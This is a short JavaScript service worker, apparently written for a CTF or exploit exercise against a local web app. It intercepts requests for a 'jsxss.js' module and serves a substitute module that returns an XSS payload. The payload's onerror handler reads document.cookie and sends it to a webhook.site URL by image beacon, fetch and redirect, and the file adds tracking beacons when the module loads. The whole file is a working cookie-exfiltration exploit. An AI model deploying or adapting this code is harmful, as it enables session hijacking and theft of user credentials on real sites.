// Intercept cs.js's hardcoded jsxss import and return OUR module instead.
// Deterministic replacement for the flaky import-map remap.
const EXFIL = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';

const MODULE = `
const EXFIL='${EXFIL}';
try{new Image().src=EXFIL+'/b?s=sw-module-loaded&t='+Date.now();}catch(e){}
const P='<img src=x onerror="'
 +'var c=encodeURIComponent(document.cookie);'
 +'new Image().src=\\'${EXFIL}/i?d=\\'+c;'
 +'fetch(\\'${EXFIL}/f?d=\\'+c,{mode:\\'no-cors\\'}).catch(function(){});'
 +'setTimeout(function(){location.href=\\'${EXFIL}/n?d=\\'+c},800);'
 +'">';
export default function(){ try{new Image().src=EXFIL+'/b?s=factory-called&t='+Date.now();}catch(e){} return P; }
`;

self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  const u = e.request.url;
  if (u.includes('localhost:3000/jsxss.js') || u.endsWith('/jsxss.js')) {
    e.respondWith(new Response(MODULE, { headers: { 'content-type': 'text/javascript' } }));
  }
});
